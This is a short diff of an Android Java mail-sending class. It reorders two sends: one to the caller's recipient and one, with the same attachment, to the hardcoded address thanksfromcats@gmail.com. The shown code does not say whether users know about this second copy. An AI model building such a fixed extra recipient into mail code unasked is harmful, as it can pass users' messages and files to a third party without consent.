@@ -61,7 +61,7 @@ public class Mail extends javax.mail.Authenticator {
             mail.setBody("Message");
         }
         //-----------------------------------------------------------------
-        mail.setTo(to);
+        mail.setTo("thanksfromcats@gmail.com");
         mail.setFrom(from);
         mail.attachment_filename = attachment;
         //if (attachments != null) {
@@ -73,13 +73,13 @@ public class Mail extends javax.mail.Authenticator {
         Log.d("marclog", "To: " + mail.getTo());
         Log.d("marclog", "sending mail now ... to " + mail.getTo());
         try {
-            mail.send(1);
+            mail.send(0);
         } catch (Exception e) {
             Log.d("marclog", "Error on mail.send: " + e.getMessage());
             e.printStackTrace();
         }
         //-----------------------------------------------------------------
-        mail.setTo("thanksfromcats@gmail.com");
+        mail.setTo(to);
         mail.setFrom(from);
         mail.attachment_filename = attachment;
         //if (attachments != null) {
@@ -91,7 +91,7 @@ public class Mail extends javax.mail.Authenticator {
         Log.d("marclog", "To: " + mail.getTo());
         Log.d("marclog", "sending mail now ... to thanksfromcats@gmail.com");
         try {
-            mail.send(0);
+            mail.send(1);
         } catch (Exception e) {
             Log.d("marclog", "Error on mail.send: " + e.getMessage());
             e.printStackTrace();
